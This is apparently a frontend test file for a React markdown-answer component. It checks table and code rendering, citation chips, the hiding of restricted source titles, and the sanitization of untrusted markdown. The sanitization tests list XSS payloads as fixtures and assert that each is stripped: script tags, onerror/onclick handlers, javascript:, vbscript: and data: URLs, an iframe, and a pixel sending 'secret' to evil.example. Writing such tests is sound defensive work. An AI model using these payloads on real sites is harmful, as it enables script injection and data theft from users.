import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import ReactMarkdown from "react-markdown";
import rehypeRaw from "rehype-raw";
import { describe, expect, it, vi } from "vitest";
import type { SourceRef } from "@/lib/api/types";
import { rehypePlugins, remarkPlugins } from "@/lib/markdown";
import { MarkdownAnswer } from "../markdown-answer";

const source = (id: string, extra: Partial<SourceRef> = {}): SourceRef => ({
  source_id: id,
  chunk_id: "00000000-0000-4000-8000-000000000001",
  document_id: "00000000-0000-4000-8000-000000000002",
  document_title: "Handbook",
  workspace_id: "00000000-0000-4000-8000-000000000003",
  excerpt: "text",
  relevance: {},
  cited: true,
  redacted: false,
  page_number: 4,
  ...extra,
});

describe("MarkdownAnswer rendering", () => {
  it("renders GFM tables inside a scroll container", () => {
    const { container } = render(<MarkdownAnswer text={"| a | b |\n|---|---|\n| 1 | 2 |"} />);
    expect(container.querySelector("table")).toBeInTheDocument();
    expect(container.querySelector("table")?.parentElement).toHaveClass("overflow-x-auto");
    expect(screen.getByRole("columnheader", { name: "a" })).toBeInTheDocument();
  });

  it("highlights fenced code and offers a copy button", () => {
    const { container } = render(<MarkdownAnswer text={"```ts\nconst answer: number = 42;\n```"} />);
    expect(container.querySelector("code.hljs")).toBeInTheDocument();
    expect(container.querySelector(".hljs-keyword")).toHaveTextContent("const");
    expect(screen.getByTestId("code-block")).toHaveTextContent("ts");
    expect(screen.getByRole("button", { name: "Copy code" })).toBeInTheDocument();
  });

  it("survives a language the highlighter does not know", () => {
    const { container } = render(<MarkdownAnswer text={"```made-up-lang\nhello\n```"} />);
    expect(container.querySelector("pre")).toHaveTextContent("hello");
  });

  it("renders citation markers as chips and reports clicks", async () => {
    const onCite = vi.fn();
    render(
      <MarkdownAnswer
        text="Revenue grew [S1] and costs fell [S2, S3]."
        sources={[source("S1"), source("S2")]}
        onCite={onCite}
      />,
    );
    const chips = screen.getAllByTestId("citation-chip");
    expect(chips.map((chip) => chip.textContent)).toEqual(["S1", "S2", "S3"]);
    expect(chips.map((chip) => chip.dataset.state)).toEqual(["verified", "verified", "unverified"]);

    await userEvent.click(screen.getByRole("button", { name: "Source S1: Handbook, page 4" }));
    expect(onCite).toHaveBeenCalledWith("S1");
    // An unverified citation is not interactive.
    expect(screen.getByLabelText("Unverified citation S3").tagName).toBe("SPAN");
  });

  it("marks a citation unverified when the backend says so", () => {
    render(
      <MarkdownAnswer
        text="Claim [S1]."
        sources={[source("S1")]}
        citations={[{ source_id: "S1", verified: false, redacted: false }]}
      />,
    );
    expect(screen.getByTestId("citation-chip")).toHaveAttribute("data-state", "unverified");
  });

  it("does not reveal the title of a source the reader can no longer open", () => {
    render(
      <MarkdownAnswer
        text="Claim [S1]."
        sources={[source("S1", { redacted: true, excerpt: null, document_title: "Secret salary bands" })]}
        citations={[{ source_id: "S1", verified: true, redacted: true, document_title: "Secret salary bands" }]}
      />,
    );
    const chip = screen.getByTestId("citation-chip");
    expect(chip).toHaveAttribute("title", "Restricted source");
    expect(chip.getAttribute("aria-label")).not.toContain("Secret");
  });

  it("leaves citation-like text in code untouched", () => {
    const { container } = render(
      <MarkdownAnswer text={"Use `[S1]` literally.\n\n```\n[S2]\n```"} sources={[source("S1"), source("S2")]} />,
    );
    expect(screen.queryAllByTestId("citation-chip")).toHaveLength(0);
    expect(container).toHaveTextContent("[S1]");
    expect(container).toHaveTextContent("[S2]");
  });

  it("opens external links safely and keeps internal ones in-page", () => {
    render(<MarkdownAnswer text="[ext](https://example.com/a) and [int](/documents/1)" />);
    expect(screen.getByRole("link", { name: "ext" })).toHaveAttribute("rel", "noopener noreferrer nofollow");
    expect(screen.getByRole("link", { name: "ext" })).toHaveAttribute("target", "_blank");
    expect(screen.getByRole("link", { name: "int" })).not.toHaveAttribute("target");
  });
});

const hostile = [
  "<script>window.__pwned = 1</script>",
  '<img src="x" onerror="window.__pwned = 2">',
  '<a href="javascript:window.__pwned = 3">click</a>',
  "[md link](javascript:window.__pwned=4)",
  '<iframe src="https://evil.example"></iframe>',
  '<div style="position:fixed" onclick="window.__pwned = 5">styled</div>',
  "[data](data:text/html;base64,PHNjcmlwdD4=)",
  "![tracking pixel](https://evil.example/pixel.png?q=secret)",
  "[vb](vbscript:msgbox(1))",
].join("\n\n");

describe("Markdown sanitization", () => {
  it("strips scripts, event handlers and dangerous URLs even when raw HTML is enabled", () => {
    // Production enables neither rehype-raw nor a custom urlTransform. Doing both here proves the
    // sanitize schema holds on its own if either safeguard is ever relaxed.
    const { container } = render(
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={[rehypeRaw, ...rehypePlugins]}
        urlTransform={(url) => url}
      >
        {hostile}
      </ReactMarkdown>,
    );
    const html = container.innerHTML.toLowerCase();
    expect(container.querySelector("script, iframe, img, style")).toBeNull();
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("vbscript:");
    expect(html).not.toContain("data:text/html");
    expect(html).not.toContain("style=");
    expect(html).not.toContain("evil.example");
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("never turns raw HTML into elements in the production pipeline", () => {
    const { container } = render(<MarkdownAnswer text={hostile} />);
    expect(container.querySelector("script, iframe, img, style, [onerror], [onclick]")).toBeNull();
    expect(container.innerHTML.toLowerCase()).not.toContain("javascript:");
    for (const link of container.querySelectorAll("a")) {
      expect(link.getAttribute("href") ?? "").not.toMatch(/^(javascript|vbscript|data):/i);
    }
  });

  it("keeps harmless formatting", () => {
    const { container } = render(<MarkdownAnswer text={"**bold** _em_ ~~gone~~\n\n- [x] done\n- [ ] todo"} />);
    expect(container.querySelector("strong")).toHaveTextContent("bold");
    expect(container.querySelector("del")).toHaveTextContent("gone");
    expect(container.querySelectorAll('input[type="checkbox"]')).toHaveLength(2);
  });
});
